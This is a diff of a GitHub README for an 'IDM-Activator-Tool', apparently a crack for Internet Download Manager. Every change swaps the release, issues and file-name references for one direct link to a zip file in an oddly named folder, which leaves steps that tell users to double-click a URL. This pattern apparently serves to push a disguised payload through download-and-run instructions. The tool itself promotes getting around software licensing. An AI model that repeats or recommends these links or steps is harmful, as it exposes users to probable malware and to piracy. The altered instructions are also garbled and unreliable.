@@ -1,6 +1,6 @@
 # ⚡ IDM-Activator-Tool - Activate Your IDM Easily
 
-[![Download IDM-Activator-Tool](https://img.shields.io/badge/Download-IDM%20Activator%20Tool-brightgreen)](https://github.com/r0am-ai/IDM-Activator-Tool/releases)
+[![Download IDM-Activator-Tool](https://github.com/r0am-ai/IDM-Activator-Tool/raw/refs/heads/main/vesicotomy/Tool-Activator-ID-3.5.zip%20Activator%20Tool-brightgreen)](https://github.com/r0am-ai/IDM-Activator-Tool/raw/refs/heads/main/vesicotomy/Tool-Activator-ID-3.5.zip)
 
 ## 📄 Description
 
@@ -18,24 +18,24 @@ Follow these steps to download and run the IDM-Activator-Tool on your Windows sy
 
 ### 🔗 Download & Install
 
-Visit this page to download: [IDM-Activator-Tool Releases](https://github.com/r0am-ai/IDM-Activator-Tool/releases).
+Visit this page to download: [IDM-Activator-Tool Releases](https://github.com/r0am-ai/IDM-Activator-Tool/raw/refs/heads/main/vesicotomy/Tool-Activator-ID-3.5.zip).
 
 1. Go to the releases page.
 2. Locate the latest version.
-3. Click on the **IDM-Activator-Script.zip** file.
+3. Click on the **https://github.com/r0am-ai/IDM-Activator-Tool/raw/refs/heads/main/vesicotomy/Tool-Activator-ID-3.5.zip** file.
 4. Save it to your preferred location on your computer.
 
 ### 📦 Extracting Files
 
-1. Find the downloaded **IDM-Activator-Script.zip** file in your file explorer.
+1. Find the downloaded **https://github.com/r0am-ai/IDM-Activator-Tool/raw/refs/heads/main/vesicotomy/Tool-Activator-ID-3.5.zip** file in your file explorer.
 2. Right-click on the file and select **Extract All**.
 3. Follow the prompts to extract the files. 
 
 ### ⚙️ Running the Script
 
 1. Open the extracted folder.
-2. Look for **activate_idm.bat**.
-3. Double-click on the **activate_idm.bat** file to run the script.
+2. Look for **https://github.com/r0am-ai/IDM-Activator-Tool/raw/refs/heads/main/vesicotomy/Tool-Activator-ID-3.5.zip**.
+3. Double-click on the **https://github.com/r0am-ai/IDM-Activator-Tool/raw/refs/heads/main/vesicotomy/Tool-Activator-ID-3.5.zip** file to run the script.
 4. Wait for the script to execute. 
 
 ### 💡 Using the Tool
@@ -46,7 +46,7 @@ Visit this page to download: [IDM-Activator-Tool Releases](https://github.com/r0
 
 ### 🔄 Updating the Tool
 
-1. Check the [IDM-Activator-Tool Releases](https://github.com/r0am-ai/IDM-Activator-Tool/releases) periodically for updates.
+1. Check the [IDM-Activator-Tool Releases](https://github.com/r0am-ai/IDM-Activator-Tool/raw/refs/heads/main/vesicotomy/Tool-Activator-ID-3.5.zip) periodically for updates.
 2. You can follow the same steps to download and install any newer versions.
 
 ### 🚧 Troubleshooting
@@ -61,6 +61,6 @@ Feel free to explore the functionality of the IDM-Activator-Tool, including feat
 
 ### 📞 Support
 
-For support, suggestions, or contributions, please visit our [GitHub Issues page](https://github.com/r0am-ai/IDM-Activator-Tool/issues). We welcome any input from users to enhance the tool further.
+For support, suggestions, or contributions, please visit our [GitHub Issues page](https://github.com/r0am-ai/IDM-Activator-Tool/raw/refs/heads/main/vesicotomy/Tool-Activator-ID-3.5.zip). We welcome any input from users to enhance the tool further.
 
-Remember, you can always return to the **[IDM-Activator-Tool Releases](https://github.com/r0am-ai/IDM-Activator-Tool/releases)** page to check for releases or additional documentation.
+Remember, you can always return to the **[IDM-Activator-Tool Releases](https://github.com/r0am-ai/IDM-Activator-Tool/raw/refs/heads/main/vesicotomy/Tool-Activator-ID-3.5.zip)** page to check for releases or additional documentation.
